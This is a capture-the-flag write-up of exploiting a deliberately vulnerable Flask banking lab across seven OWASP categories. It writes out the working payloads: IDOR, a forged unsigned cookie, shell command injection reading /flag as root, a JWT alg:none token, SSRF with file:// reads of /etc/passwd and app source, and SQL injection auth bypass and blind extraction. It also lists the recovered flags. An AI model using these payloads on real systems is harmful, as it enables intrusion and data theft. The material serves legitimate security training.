# OWASP StonksBank — Writeup

## Challenge

- **Target:** `http://172.17.0.3:5000` (own lab target, `bounty:self-demo`)
- **Stack:** Flask on Werkzeug/3.1.8, Python 3.12
- **Goal:** A deliberately vulnerable "OWASP Web Top 10" range. The landing page advertises one endpoint per demonstrable category, each guarding its own `flag{...}`. Seven flags are recoverable via live exploitation.

The index page laid out the whole map up front:

```
/api/account/<id>   (accounts)
/vip                (members only, uses the 'session' cookie)
/login?user=&pass=  (search users)
/tools/ping?host=   (network tools)
/admin              (JWT-protected, 'token' cookie)
/fetch?url=         (link preview)
```

## Approach

Enumerate every advertised endpoint first (in parallel), read the hints each one leaks, then exploit them class by class: IDOR → unsigned cookie → SQLi → command injection → exposed dotfile → JWT `alg:none` → SSRF. The app was generous — several endpoints handed out sample tokens/cookies precisely to show what a tampered one should look like. Late in the run, `file://` SSRF gave up the full source, which confirmed every finding rather than being needed to reach the flags.

## Steps

### 1. Recon
`curl` on the index revealed six endpoints. A batched probe of each returned enough to spot the whole vulnerability surface at once: `/api/account/1` leaked a flag inline, `/vip` printed a sample base64 `session` cookie, `/admin` printed a sample JWT, `/tools/ping` executed a shell (`/bin/sh: 1: ping: not found`), and `/fetch` proxied arbitrary URLs (fetched `example.com` successfully).

### 2. A01 — IDOR (worked immediately)
`GET /api/account/1` with no auth returned the admin record:
```json
{"user": "admin", "balance": 999999, "flag": "flag{a01_idor_broken_access}"}
```
Account `2` was `guest`. No authorization on the object — iterate IDs.

### 3. A02 — Unsigned session cookie (worked)
`/vip` helpfully leaked what a cookie looks like. It's just `base64(json)` with no signature, so forging admin is trivial:
```
session = base64('{"user":"admin","role":"admin"}')
→ Welcome VIP admin. flag{a02_unsigned_token_forged}
```

### 4. A03 — Command injection (worked)
`host` is concatenated into a `shell=True` call, so `;` chaining works — and it runs as root:
```
/tools/ping?host=127.0.0.1;id;cat /flag*
→ uid=0(root) gid=0(root) groups=0(root)
→ flag{a03_command_injection}
```

### 5. A07 — JWT `alg:none` (worked)
`/admin` leaked a sample HS256 token. Rather than crack the secret, forge an unsigned token with an empty signature:
```
header {"alg":"none","typ":"JWT"} . payload {"role":"admin"} .
→ admin panel. flag{a07_jwt_alg_none}
```
The server decodes with `verify_signature=False` and allows `none`.

### 6. A10 — SSRF (worked, plus bonus file read)
`/fetch` calls `urllib.request.urlopen` on any URL. Two paths:
- `url=http://127.0.0.1:5000/internal/flag` → `flag{a10_ssrf_internal}` (that endpoint returns `forbidden` when hit directly — it's gated on `remote_addr` being loopback).
- `url=file:///etc/passwd` → returned file contents. Arbitrary local file read.

Using `file:///proc/self/cmdline` (→ `python owasp_web.py`) then `file:///proc/self/cwd/owasp_web.py`, the **full application source** was recovered, confirming every finding and revealing the two flags not yet collected.

### 7. A05 — Exposed `.env` (worked, found via source)
The source showed a `/.env` route. Fetching it:
```
APP_ENV=prod
DEBUG=1
ADMIN_TOKEN=flag{a05_exposed_dotenv}
```

### 8. A03 — SQL injection (worked, one dead end on the way)
Auth bypass was instant: `user=admin'-- &pass=x` → `Welcome!`.

Extracting the `notes.flag` value was where the only real fumbles happened:
- **First tries failed silently.** `' UNION SELECT flag FROM users-- ` and `... UNION SELECT sql FROM sqlite_master-- ` both returned empty (`Invalid credentials`). The endpoint only reveals a boolean (`Welcome!` vs `Invalid credentials`) — it never prints selected data — so a straight column-dump UNION shows nothing. This is boolean-blind, not in-band.
- **First blind probe had a length bug.** `substr(flag,1,9)='flag{a03'` returned `Invalid credentials` (no match) — the 9-char prefix of `flag{a03_sqli...` is actually `flag{a03_` (with the trailing underscore), so an 8-char comparison string against a 9-char substring never matched.
- **Corrected:** `substr(flag,1,9)='flag{a03_'` → `Welcome!`, and full equality `flag='flag{a03_sqli_union_dump}'` → `Welcome!`, confirming the value. Flag: `flag{a03_sqli_union_dump}`.

## Flag

```
flag{a01_idor_broken_access}
flag{a02_unsigned_token_forged}
flag{a03_sqli_union_dump}
flag{a03_command_injection}
flag{a05_exposed_dotenv}
flag{a07_jwt_alg_none}
flag{a10_ssrf_internal}
```

Seven flags, all recovered by live exploitation. (Architectural categories A04/A06/A08/A09 were intentionally not present as live exploits on this range, per the source's own note.)

## Takeaways

- **Read the leaked hints.** `/vip` and `/admin` literally printed sample tokens showing the exact tamper target — no guessing at cookie/JWT structure needed.
- **`alg:none` beats cracking.** When a JWT endpoint disables signature verification, forge an unsigned token instead of attacking the secret.
- **Blind SQLi needs a boolean oracle, not a column dump.** The wasted `UNION SELECT flag`/`sqlite_master` attempts returned nothing because the endpoint only echoes success/failure. Recognizing that early saves iterations.
- **Watch `substr` lengths in blind extraction.** The off-by-one (`'flag{a03'` vs `'flag{a03_'`) produced a false negative that briefly looked like the injection had failed. Count the comparison string against the exact `substr(...,N)` length.
- **SSRF `file://` is a force multiplier.** Beyond reaching the loopback-gated `/internal/flag`, `file://` gave arbitrary file read and the full source — turning a single SSRF into complete whitebox knowledge of the app.